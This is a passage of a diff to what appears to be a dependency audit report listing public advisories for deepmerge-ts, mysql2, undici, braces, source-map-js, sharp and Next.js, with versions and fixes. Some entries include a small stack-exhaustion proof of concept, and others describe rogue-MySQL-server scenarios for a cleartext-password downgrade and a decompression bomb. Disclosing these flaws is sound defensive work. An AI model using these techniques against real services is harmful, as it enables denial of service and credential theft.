+      "overview": "### Summary\n\n`deepmerge()` and `deepmergeInto()` can be crashed with a crafted recursive object graph. When both merged values contain self-references at the same property path, the library recurses until Node throws `RangeError: Maximum call stack size exceeded`.\n\n### Details\n\nRecord merging is implemented recursively. For each enumerable key, the library collects the values from every input object and immediately calls the same merge routine on that property.\n\nThere is no visited-object tracking, pair tracking, or cycle detection in that recursion. As a result, if two merged records both point back to themselves through the same key path, the merge logic keeps revisiting the same object pair forever.\n\nThis is reachable through the real public API:\n\n* `deepmerge(...)`\n* `deepmergeCustom(...)(...)`\n* `deepmergeInto(target, ...)`\n* `deepmergeIntoCustom(...)(target, ...)`\n\nThe issue only occurs when recursive object graphs are supplied. Plain JSON alone does not create this condition.\n\n### PoC\n\n```js\nimport { deepmerge, deepmergeInto } from \"deepmerge-ts\";\n\nconst left = {};\nleft.self = left;\n\nconst right = {};\nright.self = right;\n\ntry {\n  deepmerge(left, right);\n} catch (error) {\n  console.log(error.name, error.message);\n  // Expected: the merge should reject or safely handle recursive input without exhausting the stack.\n  // Vulnerable behavior: RangeError Maximum call stack size exceeded\n}\n\nconst target = {};\ntarget.self = target;\n\nconst source = {};\nsource.self = source;\n\ntry {\n  deepmergeInto(target, source);\n} catch (error) {\n  console.log(error.name, error.message);\n  // Expected: the merge should reject or safely handle recursive input without exhausting the stack.\n  // Vulnerable behavior: RangeError Maximum call stack size exceeded\n}\n```\n\n### Impact\n\nApplications that pass attacker-controlled recursive object graphs into these APIs can be forced into a synchronous crash path. In Node.js services, that can terminate request handling for the affected process or trigger repeated worker restarts until the malicious input is blocked.",
+      "reported_by": null,
+      "title": "DeepmergeTS has stack exhaustion when merging recursive object graphs",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-40345"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "deepmerge-ts",
+      "vulnerable_versions": "<8.0.0",
+      "github_advisory_id": "GHSA-ggr8-5vv4-36mx",
+      "recommendation": "Upgrade to version 8.0.0 or later",
+      "patched_versions": ">=8.0.0",
+      "updated": "2026-08-17T13:32:14.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-ggr8-5vv4-36mx"
+    },
+    "1153173": {
+      "findings": [
+        {
+          "version": "3.15.3",
+          "paths": [
+            "apps__api>prisma>mysql2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sidorares/node-mysql2/security/advisories/GHSA-3f6p-5ww8-9rcr\n- https://github.com/sidorares/node-mysql2/issues/1617\n- https://github.com/sidorares/node-mysql2/pull/4236\n- https://github.com/sidorares/node-mysql2/commit/884bec56288d827939d0dd3f1f4ae476fbc8dbeb\n- https://github.com/sidorares/node-mysql2/releases/tag/v3.22.0\n- https://github.com/advisories/GHSA-3f6p-5ww8-9rcr",
+      "created": "2026-09-01T16:40:34.000Z",
+      "id": 1153173,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA rogue MySQL server (or MITM) can force mysql2 to send credentials in **plaintext** by requesting an auth switch to `mysql_clear_password`. The driver complies without verifying that TLS is active.\n\n## Details\n\n`mysql_clear_password` is registered as a default standard plugin in `lib/commands/auth_switch.js` (line 21). When a server sends an AuthSwitchRequest (0xFE) requesting `mysql_clear_password`, the driver executes it without checking for TLS. The plugin (`lib/auth_plugins/mysql_clear_password.js`) returns `Buffer.from(password + '\\0')`.\n\nNote: `caching_sha2_password` plugin DOES check for SSL before sending cleartext (line 77). But `mysql_clear_password` has no such guard.\n\n## Attack Scenario\n\n1. Attacker operates rogue MySQL server or performs MITM\n2. Server advertises `caching_sha2_password` in handshake\n3. Client sends hashed auth response\n4. Server replies with AuthSwitchRequest to `mysql_clear_password`\n5. Client sends password in plaintext\n6. Attacker captures plaintext password\n\n## PoC\n\nRogue MySQL server (Node.js, ~80 lines) that captures plaintext passwords from mysql2 clients. Tested against mysql2 3.20.0. Full PoC available on request.\n\n## Suggested Fix\n\nRemove `mysql_clear_password` from `standardAuthPlugins`, or add a guard requiring TLS/unix socket before allowing cleartext auth.\n\n## Impact\n\n- mysql2: 9M weekly downloads\n- Any application connecting without TLS is vulnerable to credential theft\n- Cloud environments with untrusted network paths are especially at risk",
+      "reported_by": null,
+      "title": "MySQL2: Auth Plugin Downgrade to mysql_clear_password Leaks Plaintext Credentials",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "mysql2",
+      "vulnerable_versions": "<3.22.0",
+      "github_advisory_id": "GHSA-3f6p-5ww8-9rcr",
+      "recommendation": "Upgrade to version 3.22.0 or later",
+      "patched_versions": ">=3.22.0",
+      "updated": "2026-09-01T16:40:35.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-522"
+      ],
+      "url": "https://github.com/advisories/GHSA-3f6p-5ww8-9rcr"
+    },
+    "1158532": {
+      "findings": [
+        {
+          "version": "3.15.3",
+          "paths": [
+            "apps__api>prisma>mysql2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sidorares/node-mysql2/security/advisories/GHSA-rgwj-5xj2-c3m3\n- https://github.com/sidorares/node-mysql2/commit/7c48343c95ecc80d30d6ebfa67875947b7d848d2\n- https://github.com/sidorares/node-mysql2/releases/tag/v3.23.1\n- https://github.com/advisories/GHSA-rgwj-5xj2-c3m3",
+      "created": "2026-08-31T22:36:20.000Z",
+      "id": 1158532,
+      "npm_advisory_id": null,
+      "overview": "## Vulnerability Details\n\n**File**: `lib/compressed_protocol.js`\n**Line**: 43 (`zlib.inflate(body, (err, data) => { ... })` inside `handleCompressedPacket`)\n\n### Root Cause\nWhen a connection is created with `compress: true` (and the server advertises `CLIENT_COMPRESS`), every incoming packet is unwrapped by `handleCompressedPacket()` in `lib/compressed_protocol.js`, which calls:\n\n```js\nzlib.inflate(body, (err, data) => { ... });\n```\n\nNo options object (in particular, no `maxOutputLength`) is passed. Node's zlib convenience methods default `maxOutputLength` to `buffer.kMaxLength`, which on this platform is `Number.MAX_SAFE_INTEGER` — i.e. effectively unbounded until the process runs out of memory. The 3-byte \"length of payload before compression\" field in the compressed-packet header is read (`packet.readInt24()`) but is only used to branch on `!== 0`; it is never used to cap or validate the actual inflate output size, and the real decompressed size is determined purely by the attacker-supplied deflate stream.\n\nBecause DEFLATE can reach compression ratios over 1000:1 for crafted repetitive input, an attacker who controls (or MITMs, on a non-TLS connection) the MySQL server endpoint can send a single small compressed packet that expands to gigabytes in the client's memory — a classic decompression-bomb / \"zip bomb\" applied to MySQL's client-compression protocol.\n\n### Attack Scenario\n1. Application connects with `mysql2`/`mysql2/promise` using `compress: true` (a documented option for reducing bandwidth, commonly used for cloud/WAN DB connections).\n2. The connection target is attacker-controlled or attacker-compromised, or an attacker MITMs a non-TLS connection.\n3. Right after authentication succeeds, the malicious endpoint sends one crafted compressed packet whose deflate stream is small on the wire (hundreds of KB) but decompresses to several GB.\n4. `zlib.inflate()` starts allocating memory for the full decompressed output with no ceiling.\n5. The Node.js process's RSS grows uncontrolled until OOM-kill or crash — no query needs to be issued by the client; the malicious packet alone is enough.\n\n### Impact\nDenial of Service of the client application (process crash / OOM) — not the database itself. No authentication bypass or data exposure. Requires `compress: true` plus a malicious/compromised server or MITM position.\n\n### Vulnerable Code\n```js\nfunction handleCompressedPacket(packet) {\n  const connection = this;\n  const deflatedLength = packet.readInt24();\n  const body = packet.readBuffer();\n\n  if (deflatedLength !== 0) {\n    connection.inflateQueue.push((task) => {\n      zlib.inflate(body, (err, data) => {\n        if (err) {\n          connection._handleNetworkError(err);\n          return;\n        }\n        connection._bumpCompressedSequenceId(packet.numPackets);\n        connection._inflatedPacketsParser.execute(data);\n        task.done();\n      });\n    });\n  } else {\n    ...\n  }\n}\n```\n\n### Recommended Fix\n```js\nconst MAX_INFLATED_PACKET_SIZE = 1 * 1024 * 1024 * 1024; // e.g. 1 GiB, ideally configurable\n\nzlib.inflate(body, { maxOutputLength: MAX_INFLATED_PACKET_SIZE }, (err, data) => {\n  if (err) {\n    connection._handleNetworkError(err);\n    return;\n  }\n  ...\n});\n```\n`maxOutputLength` makes `zlib.inflate` abort with `ERR_BUFFER_TOO_LARGE` as soon as the decompressed size would exceed the cap, routing into the exact same (already-existing) `err` → `connection._handleNetworkError(err)` path, so no new error-handling logic is required.\n\n### Verification\nDynamically confirmed on v3.23.0 (HEAD) using a minimal rogue \"MySQL server\" built on node-mysql2's own server-mode helpers (`mysql.createServer`, `Packets.Handshake`, `connection.writeOk()`). The rogue server completes a real handshake advertising `CLIENT_COMPRESS`, then writes one raw compressed frame (509,604 bytes on the wire — a zlib deflate of 500 MB of zero bytes, ratio 1028.8:1) directly to the socket. A normal `mysql.createConnection({ ..., compress: true })` victim client — which never issues any query — had its RSS grow from 74.3 MB to 1115.0 MB after receiving that single packet, before erroring out with `PROTOCOL_UNEXPECTED_PACKET` once the client tried to parse the inflated zero-filled buffer as MySQL packets. The memory allocation happens unconditionally before any content validation.",
+      "reported_by": null,
+      "title": "MySQL2: Unbounded zlib inflate in compressed MySQL protocol handler allows decompression-bomb DoS",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "mysql2",
+      "vulnerable_versions": "<=3.23.0",
+      "github_advisory_id": "GHSA-rgwj-5xj2-c3m3",
+      "recommendation": "Upgrade to version 3.23.1 or later",
+      "patched_versions": ">=3.23.1",
+      "updated": "2026-09-02T15:28:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-409"
+      ],
+      "url": "https://github.com/advisories/GHSA-rgwj-5xj2-c3m3"
+    },
+    "1240039": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-r53p-7pc4-xj5r\n- https://nvd.nist.gov/vuln/detail/CVE-2026-18540\n- https://github.com/nodejs/undici/commit/0160a719063fb0a77f4fdf9500b9166b91e14329\n- https://github.com/nodejs/undici/commit/cd8af90b38ae33c2838d54a2d629774122effe95\n- https://github.com/nodejs/undici/commit/ce31bc824b578008faae5d3350da66c1b5f71548\n- https://hackerone.com/reports/3900104\n- https://hackerone.com/reports/3900615\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.1\n- https://github.com/nodejs/undici/releases/tag/v7.29.1\n- https://github.com/nodejs/undici/releases/tag/v8.10.2\n- https://github.com/advisories/GHSA-r53p-7pc4-xj5r",
+      "created": "2026-09-29T18:22:07.000Z",
+      "id": 1240039,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUndici's `interceptors.retry()` can resume a request after a partial response and append the resumed bytes to an already partially delivered body, while the application still receives the original response's status and headers. When that response carried a `Content-Length`, the application can receive a longer body. Applications that forward Undici's status, headers, and body downstream without recalculating framing, for example proxy or gateway applications, may emit a response whose body exceeds the forwarded `Content-Length`, and the excess bytes can be read as the start of a subsequent HTTP response (downstream response splitting or desynchronization).\n\nFor example, a `404 Not Found` with `Content-Length: 2` that sends one byte then closes can be resumed with an open-ended `Range` request, and the resumed `206 Partial Content` bytes are appended, so the application receives more than two body bytes while still seeing `Content-Length: 2`. The bug requires `interceptors.retry()` enabled, an attacker-controlled or faulty upstream, and a downstream forwarder that does not recalculate `Content-Length`.\n\n### Patches\n\nPatched in undici v6.28.1, v7.29.1, and v8.10.2. Upgrade to one of these or later.\n\n### Workarounds\n\n- Disable `interceptors.retry()` for untrusted upstreams, or set `maxRetries: 0`.\n- Remove or recalculate `Content-Length` before forwarding a response body assembled by Undici.",
+      "reported_by": null,
+      "title": "undici vulnerable to downstream response splitting via retry interceptor",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-18540"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.28.1",
+      "github_advisory_id": "GHSA-r53p-7pc4-xj5r",
+      "recommendation": "Upgrade to version 6.28.1 or later",
+      "patched_versions": ">=6.28.1",
+      "updated": "2026-09-29T18:22:08.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-r53p-7pc4-xj5r"
+    },
+    "1240042": {
+      "findings": [
+        {
+          "version": "6.20.1",
+          "paths": [
+            "apps__api>@nestjs/mau>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-rfgv-xxqx-mfg5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-19534\n- https://github.com/nodejs/undici/commit/2af0faf88b906d3127a360c3ac75164c0f95e5a5\n- https://github.com/nodejs/undici/commit/6615e0175e9b635bcd2e3e87a47daa82f6f5b728\n- https://github.com/nodejs/undici/commit/66e12816064cf3068f63bd134748b7fc4e779bad\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.1\n- https://github.com/nodejs/undici/releases/tag/v7.29.1\n- https://github.com/nodejs/undici/releases/tag/v8.10.2\n- https://github.com/advisories/GHSA-rfgv-xxqx-mfg5",
+      "created": "2026-09-29T18:21:33.000Z",
+      "id": 1240042,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe undici WebSocket client throws an uncaught `TypeError` during the opening handshake when a server's `101` response includes a `Sec-WebSocket-Protocol` header that the client never requested. The throw occurs in a `queueMicrotask` callback with no surrounding `try`/`catch`, so it propagates as an uncaught exception and terminates the Node.js process. This is a remote, unauthenticated denial of service against any application that opens a WebSocket to an attacker controlled or compromised server, or over a plaintext `ws://` connection subject to a machine-in-the-middle. It affects the default `new WebSocket(url)` usage, where no subprotocol is requested. Per RFC 6455 section 4.1, an unrequested subprotocol must fail the connection, not crash it.\n\nAll releases starting at undici 6.7.0 are affected.\n\n### Patches\n\nUpgrade to undici 6.28.1, 7.29.1, or 8.10.2.\n\n### Workarounds\n\nNo workaround is available. The fix must be applied through an upgrade.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unrequested WebSocket subprotocol",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-19534"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=6.7.0 <6.28.1",
+      "github_advisory_id": "GHSA-rfgv-xxqx-mfg5",
+      "recommendation": "Upgrade to version 6.28.1 or later",
+      "patched_versions": ">=6.28.1",
+      "updated": "2026-09-29T18:21:41.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-252"
+      ],
+      "url": "https://github.com/advisories/GHSA-rfgv-xxqx-mfg5"
+    },
+    "1240992": {
+      "findings": [
+        {
+          "version": "3.0.3",
+          "paths": [
+            "apps__web>eslint-config-next>@next/eslint-plugin-next>fast-glob>micromatch>braces"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93687\n- https://github.com/micromatch/braces/issues/70\n- https://github.com/micromatch/braces/blob/3.0.3/lib/compile.js#L49-L53\n- https://github.com/micromatch/braces/blob/3.0.3/lib/expand.js#L102-L105\n- https://github.com/micromatch/braces/blob/3.0.3/lib/parse.js#L38-L40\n- https://www.vulncheck.com/advisories/braces-through-3.0.3-stack-overflow-via-deeply-nested-patterns\n- https://github.com/advisories/GHSA-vfj7-8cjw-p6xm",
+      "created": "2026-09-18T18:31:41.000Z",
+      "id": 1240992,
+      "npm_advisory_id": null,
+      "overview": "braces through 3.0.3 contains a stack overflow vulnerability in the recursive AST walkers that lack depth guards. Attackers can supply deeply nested brace patterns under the character limit to exhaust the call stack and terminate the Node.js process with an uncaught RangeError.",
+      "reported_by": null,
+      "title": "braces vulnerable to stack-exhaustion denial of service through deeply nested patterns",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93687"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "braces",
+      "vulnerable_versions": "<=3.0.3",
+      "github_advisory_id": "GHSA-vfj7-8cjw-p6xm",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-02T22:36:34.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-vfj7-8cjw-p6xm"
+    },
+    "1241209": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "apps__api>@vitest/coverage-v8>magicast>source-map-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93749\n- https://github.com/7rulnik/source-map-js/issues/76\n- https://github.com/7rulnik/source-map-js\n- https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118\n- https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service\n- https://github.com/7rulnik/source-map-js/pull/79\n- https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016\n- https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2\n- https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1241209,
+      "npm_advisory_id": null,
+      "overview": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+      "reported_by": null,
+      "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93749"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "source-map-js",
+      "vulnerable_versions": ">=1.0.0 <1.2.2",
+      "github_advisory_id": "GHSA-68fv-2mgg-jv7q",
+      "recommendation": "Upgrade to version 1.2.2 or later",
+      "patched_versions": ">=1.2.2",
+      "updated": "2026-10-05T23:31:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q"
+    },
+    "1241331": {
+      "findings": [
+        {
+          "version": "0.35.4",
+          "paths": [
+            "apps__web>next>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-wq5f-xc86-pv6w\n- https://github.com/lovell/sharp/commit/96de105d9d36ab04c76c2b78b97255171630d236\n- https://github.com/lovell/sharp/releases/tag/v0.35.5\n- https://gitlab.gnome.org/GNOME/librsvg/-/work_items/1241\n- https://www.cve.org/CVERecord?id=CVE-2026-96889\n- https://github.com/advisories/GHSA-wq5f-xc86-pv6w",
+      "created": "2026-10-06T13:43:57.000Z",
+      "id": 1241331,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA memory-related vulnerability has been discovered and fixed in the upstream librsvg dependency. When certain runtime-specific conditions apply, this vulnerability can lead to possible remote code execution (RCE) on glibc-based Linux.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.5, which provides librsvg 2.63.2.\n\n#### Using a globally-installed librsvg?\n\nPlease ensure you are using the latest librsvg 2.63.2.\n\n### Workarounds\n\nAdd the following to your code to prevent sharp from decoding SVG images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadSvg\"] });\n```\n\nTo avoid RCE, ensure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already use this security-hardening feature however be warned that the \"official\" Node.js binaries do not.\n1",
+      "reported_by": null,
+      "title": "sharp : Vulnerability in librsvg dependency CVE-2026-96889",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.5",
+      "github_advisory_id": "GHSA-wq5f-xc86-pv6w",
+      "recommendation": "Upgrade to version 0.35.5 or later",
+      "patched_versions": ">=0.35.5",
+      "updated": "2026-10-06T13:43:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-416",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-wq5f-xc86-pv6w"
+    },
+    "1241489": {
+      "findings": [
+        {
+          "version": "16.3.6",
+          "paths": [
+            "apps__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-3w37-wq28-93x7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-94544\n- https://github.com/vercel/next.js/commit/bd9214f9a32854a011bf5fe58e481dffe1bbf598\n- https://github.com/vercel/next.js/releases/tag/v16.3.8\n- https://github.com/advisories/GHSA-3w37-wq28-93x7",
+      "created": "2026-10-07T20:32:13.000Z",
+      "id": 1241489,
+      "npm_advisory_id": null,
+      "overview": "Pending `use cache` fills are shared across requests for the same key without distinguishing Draft Mode requests from regular requests. When two such requests overlap, the second request receives the first request's fill:\n\n- A regular request that overlaps an editor's Draft Mode request receives unpublished content, without any authentication.\n- A Draft Mode request that overlaps a regular request receives published content instead of the draft.\n\nIf the overlapping regular request prerenders a page — for example an on-demand prerender of a route that was not prerendered at build time — the unpublished content can be persisted into the generated page and served to all later visitors of that route until the page is revalidated. Since cached functions can be shared across routes, the poisoned page does not need to be the page the editor is previewing.\n\nSites are affected if they enable Cache Components (or `experimental.useCache`) and serve Draft Mode previews whose cached functions return draft-dependent content.",
+      "reported_by": null,
+      "title": "Next.js: Pending `use cache` fill can leak Draft Mode content into regular responses and persisted pages",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-94544"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=16.3.0 <16.3.8",
+      "github_advisory_id": "GHSA-3w37-wq28-93x7",
+      "recommendation": "Upgrade to version 16.3.8 or later",
+      "patched_versions": ">=16.3.8",
+      "updated": "2026-10-07T20:32:15.000Z",
+      "cvss": {
+        "score": 4.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-3w37-wq28-93x7"
+    },
+    "1241490": {
+      "findings": [
+        {
+          "version": "16.3.6",
+          "paths": [
+            "apps__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-4jqv-mc3x-m676\n- https://nvd.nist.gov/vuln/detail/CVE-2026-94543\n- https://github.com/vercel/next.js/commit/52c94abdd2ea5f416f5e8353ea8a2edd3fe311b8\n- https://github.com/vercel/next.js/commit/719e4c67d6e92df60246f95e1d96e2dd60789a52\n- https://github.com/vercel/next.js/releases/tag/v15.5.27\n- https://github.com/vercel/next.js/releases/tag/v16.3.8\n- https://github.com/advisories/GHSA-4jqv-mc3x-m676",
+      "created": "2026-10-07T20:32:06.000Z",
+      "id": 1241490,
+      "npm_advisory_id": null,
+      "overview": "Self-hosted Next.js applications that use the Pages Router with statically generated (SSG) or incrementally regenerated (ISR) pages can have a page's cache entry replaced with content from a different route, causing the affected page to serve wrong content to every visitor until the entry is revalidated. Applications deployed on Vercel are not affected.",
+      "reported_by": null,
+      "title": "Next.js has cache poisoning of SSG and ISR pages in self-hosted applications",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-94543"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=16.0.0 <16.3.8",
+      "github_advisory_id": "GHSA-4jqv-mc3x-m676",
+      "recommendation": "Upgrade to version 16.3.8 or later",
+      "patched_versions": ">=16.3.8",
+      "updated": "2026-10-07T20:32:07.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-4jqv-mc3x-m676"
+    },
+    "1241492": {
+      "findings": [
+        {
+          "version": "16.3.6",
+          "paths": [
+            "apps__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-39w2-rjm5-chcv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-94486\n- https://github.com/vercel/next.js/commit/2d9f50a409312696145b82b3157aadb6b1fef476\n- https://github.com/vercel/next.js/releases/tag/v16.3.8\n- https://github.com/advisories/GHSA-39w2-rjm5-chcv",
+      "created": "2026-10-07T20:31:51.000Z",
+      "id": 1241492,
+      "npm_advisory_id": null,
+      "overview": "The Next.js development server (`next dev`) exposes a Model Context Protocol endpoint that does not verify which website a request originates from, allowing a malicious website visited by the developer to read sensitive development data — including the project's location on disk, source code snippets from error reports, the route inventory, and development logs. Only applications run with `next dev` are affected. Production deployments do not serve this endpoint.",
+      "reported_by": null,
+      "title": "Next.js has information disclosure in development server's Model Context Protocol endpoint",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-94486"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=16.0.0 <16.3.8",
+      "github_advisory_id": "GHSA-39w2-rjm5-chcv",
+      "recommendation": "Upgrade to version 16.3.8 or later",
+      "patched_versions": ">=16.3.8",
+      "updated": "2026-10-07T20:31:52.000Z",
+      "cvss": {
+        "score": 5.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-39w2-rjm5-chcv"
+    },
+    "1241493": {
+      "findings": [
+        {
+          "version": "16.3.6",
+          "paths": [
+            "apps__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-f87g-xv8r-7p7x\n- https://nvd.nist.gov/vuln/detail/CVE-2026-94485\n- https://github.com/vercel/next.js/commit/2d9f50a409312696145b82b3157aadb6b1fef476\n- https://github.com/vercel/next.js/releases/tag/v16.3.8\n- https://github.com/advisories/GHSA-f87g-xv8r-7p7x",
+      "created": "2026-10-07T20:31:33.000Z",
+      "id": 1241493,
+      "npm_advisory_id": null,
+      "overview": "In Next.js App Router applications built with webpack, metadata image routes such as opengraph-image and twitter-image ignore the `dynamicParams` route segment option. An attacker can request metadata image URLs for dynamic segments that were deliberately excluded from `generateStaticParams()`.",
+      "reported_by": null,
+      "title": "Next.js has information disclosure in App Router metadata image routes via dynamicParams bypass",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-94485"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=16.0.0 <16.3.8",
+      "github_advisory_id": "GHSA-f87g-xv8r-7p7x",
+      "recommendation": "Upgrade to version 16.3.8 or later",
+      "patched_versions": ">=16.3.8",
+      "updated": "2026-10-07T20:31:35.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-f87g-xv8r-7p7x"
+    },
+    "1241495": {
+      "findings": [
+        {
+          "version": "16.3.6",
+          "paths": [
+            "apps__web>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mcj8-r9mp-w47p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-94484\n- https://github.com/vercel/next.js/commit/52c94abdd2ea5f416f5e8353ea8a2edd3fe311b8\n- https://github.com/vercel/next.js/commit/719e4c67d6e92df60246f95e1d96e2dd60789a52\n- https://github.com/vercel/next.js/releases/tag/v15.5.27\n- https://github.com/vercel/next.js/releases/tag/v16.3.8\n- https://github.com/advisories/GHSA-mcj8-r9mp-w47p",
+      "created": "2026-10-07T20:31:13.000Z",
+      "id": 1241495,
+      "npm_advisory_id": null,
+      "overview": "Next.js applications that use a root-level catch-all page together with statically generated or Incremental Static Regeneration routes can have their shared response cache poisoned by a single unauthenticated crafted request.",
+      "reported_by": null,
+      "title": "Next.js has cache poisoning in SSG/ISR rendering that leads to cross-user content substitution and persistent denial of service",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-94484"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=16.0.0 <16.3.8",
+      "github_advisory_id": "GHSA-mcj8-r9mp-w47p",
+      "recommendation": "Upgrade to version 16.3.8 or later",
+      "patched_versions": ">=16.3.8",
+      "updated": "2026-10-07T20:31:15.000Z",
+      "cvss": {
+        "score": 4.8,
